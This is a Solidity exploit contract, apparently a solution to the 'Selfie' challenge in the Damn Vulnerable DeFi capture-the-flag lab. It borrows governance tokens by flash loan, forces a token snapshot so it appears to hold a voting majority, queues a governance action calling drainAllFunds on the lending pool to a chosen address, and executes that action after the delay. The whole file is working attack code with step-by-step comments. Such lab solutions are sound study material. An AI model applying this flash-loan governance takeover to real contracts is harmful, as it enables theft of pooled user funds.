pragma solidity ^0.6.2;

import "../DamnValuableTokenSnapshot.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}

contract SelfiePoolExp {

    ISelfiePool selfiePool;
    ISimpleGovernance simpleGov;
    uint256 actionId = 0;

    constructor(address _spAddr, address _sgAddr) public {
        selfiePool = ISelfiePool(_spAddr);
        simpleGov = ISimpleGovernance(_sgAddr);
    }

    // first part: to pass _hasEnoughVotes check
    function receiveTokens(address _token, uint256 amount) external {
        DamnValuableTokenSnapshot govToken = DamnValuableTokenSnapshot(_token);
        govToken.snapshot();
        govToken.transfer(address(selfiePool), amount);
    } 

    function forceSnapshot(uint256 amount) public {
        selfiePool.flashLoan(amount);
    }

    // second part: queue the action, I chose a wei amount which should be enough for gas price.
    /*
     * I give a random wei to queAction at first and spent some time to figure out how should
     * I call a nonpayable function with value. Then I find out I can just call it with 0 wei :/  
     */
    function queAction(address eoa) public returns (uint256) {
        actionId = simpleGov.queueAction(
            address(selfiePool),
            abi.encodeWithSignature("drainAllFunds(address)", eoa),
            0);
    }

    // third part: execute the action, this should be run at least 2 days later than queAction
    function execAction() public {
        simpleGov.executeAction(actionId);
    }
}